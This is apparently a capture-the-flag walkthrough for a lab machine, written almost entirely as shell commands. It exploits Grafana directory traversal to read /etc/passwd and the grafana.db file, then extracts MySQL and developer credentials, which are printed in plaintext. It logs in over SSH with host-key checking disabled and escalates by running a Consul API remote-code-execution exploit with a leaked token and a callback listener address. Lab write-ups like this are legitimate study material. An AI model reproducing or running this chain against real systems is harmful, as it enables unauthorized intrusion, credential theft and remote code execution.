### Exploit
```bash
# found dir traversal on port 3000 grafana
curl --path-as-is "http://10.10.11.183:3000/public/plugins/mysql/../../../../../../../../../etc/passwd"

# get db file
curl --path-as-is "http://10.10.11.183:3000/public/plugins/mysql/../../../../../../../../../var/lib/grafana/grafana.db" --output - > grafana.db

# found mysql cred
|1|1|mysql|mysql.yaml|proxy||dontStandSoCloseToMe63221!|grafana|grafana|0|||0|{}|2022-09-01 22:43:03|2022-12-05 11:38:26|0|{}|1|uKewFgM4z

# login grafana:dontStandSoCloseToMe63221! through mysql and found developer's cred
+-----------+------------------------------------------+
| user      | pass                                     |
+-----------+------------------------------------------+
| developer | YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg== |
+-----------+------------------------------------------+

# access machine
sshpass -p 'anEnglishManInNewYork027468' ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" developer@$IP

```

### PrivEsc
```bash
# get git history
git logs

# show detail of commites
git show 33a53ef9a207976d5ceceddc41a199558843bf3c

# found services and token
consul
bb03b43b-1d81-d62b-24b5-39540ee469b5

# exploit
https://github.com/GatoGamer1155/Hashicorp-Consul-RCE-via-API

# run exploit
python3 exploit.py 127.0.0.1 80 10.10.14.17 443 bb03b43b-1d81-d62b-24b5-39540ee469b5
```

